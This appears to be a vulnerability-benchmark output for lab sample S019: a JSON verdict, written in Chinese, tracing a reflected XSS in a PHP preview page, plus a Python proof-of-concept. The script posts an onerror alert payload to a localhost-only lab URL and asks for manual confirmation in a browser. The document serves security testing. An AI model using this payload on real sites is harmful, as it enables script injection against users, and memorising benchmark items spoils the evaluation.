@@ -1,0 +1,64 @@
+```json
+{"sample_id":"S019","prediction":"vulnerable","vulnerability_type":"XSS","locations":["F01:0005","F01:0006","F01:0008","F02:0011","F02:0016"],"evidence":{"source":"F01:0005 读取 POST 字段 content，F01:0006 仅收敛为字符串，内容可由请求方控制","flow":"F01:0005 $input -> F01:0006 $content -> F01:0008 require templates/preview.php -> F02:0016 echo $content","guard":"无效：F02:0011 的 textarea 位置使用 htmlspecialchars 转义，但 F02:0016 的预览 div 在 HTML 正文中直接输出 $content，未编码、未净化，也未看到 CSP","sink":"F02:0016 在 div.preview 的 HTML 正文中直接 echo $content，可解释为 HTML 标签和事件属性"},"prerequisites":["PHP 8.5 本机环境按给定 runtime 运行","http://127.0.0.1:4280/lab_cases/S019/index.php 可访问","POST content 与同响应预览渲染路径可达","需人工在浏览器确认脚本执行，HTTP 响应出现字符串不作为执行证据"],"missing_context":[],"poc_generated":true,"poc_language":"python3","poc_instructions":"运行：python3 s019_poc.py。脚本固定 POST 到 http://127.0.0.1:4280/lab_cases/S019/index.php，不跟随重定向、不访问其他主机、不外发数据。先发送普通输入“普通预览内容 S019-NORMAL”，再发送测试输入 <img src=x onerror=alert('S019-XSS')>。脚本输出响应状态和预览区片段；响应体出现原始 payload 只表示模型/脚本阶段发现未编码输出，不等同浏览器执行。人工验证：浏览器打开同一入口，普通输入提交后预览区应只显示文本；测试输入提交后应由人工观察是否弹出 S019-XSS 提示框。若弹窗或自定义页面标记出现，可判定实际触发；若只看到字符串、被 CSP/扩展拦截、无 JavaScript 或服务不可达，则不能判定实际触发。数据库：本样本无数据库，无存储型读取步骤。普通业务对照和测试步骤均在同一固定主机路径进行。"}
+```
+
+```python
+import http.client
+from urllib.parse import urlencode
+
+TARGET_HOST = "127.0.0.1"
+TARGET_PORT = 4280
+TARGET_PATH = "/lab_cases/S019/index.php"
+
+
+def post_content(content: str):
+    if TARGET_HOST != "127.0.0.1" or TARGET_PORT != 4280:
+        raise SystemExit("目标必须固定为 127.0.0.1:4280")
+
+    body = urlencode({"content": content}).encode("utf-8")
+    headers = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Accept": "text/html",
+    }
+
+    conn = http.client.HTTPConnection(TARGET_HOST, TARGET_PORT, timeout=10)
+    try:
+        conn.request("POST", TARGET_PATH, body=body, headers=headers)
+        resp = conn.getresponse()
+        data = resp.read().decode("utf-8", "replace")
+        return resp.status, resp.getheader("Content-Type"), data
+    finally:
+        conn.close()
+
+
+def show(label: str, content: str):
+    status, ctype, data = post_content(content)
+    print(f"[{label}] status={status} content-type={ctype}")
+
+    marker = '<div class="preview">'
+    idx = data.find(marker)
+    if idx == -1:
+        print("未找到预览区片段")
+    else:
+        print(data[idx:idx + 400])
+
+    print("响应体包含原始输入:", content in data)
+    print("-" * 60)
+
+
+def main():
+    normal = "普通预览内容 S019-NORMAL"
+    payload = "<img src=x onerror=alert('S019-XSS')>"
+
+    show("普通对照", normal)
+    show("测试输入", payload)
+
+    print("人工浏览器步骤：打开 http://127.0.0.1:4280/lab_cases/S019/index.php")
+    print("1) 普通输入提交，预览区应只显示文本；")
+    print("2) 测试输入提交，人工确认是否弹出 S019-XSS；")
+    print("HTTP 响应体出现 payload 不等于 JavaScript 执行。")
+
+
+if __name__ == "__main__":
+    main()
+```
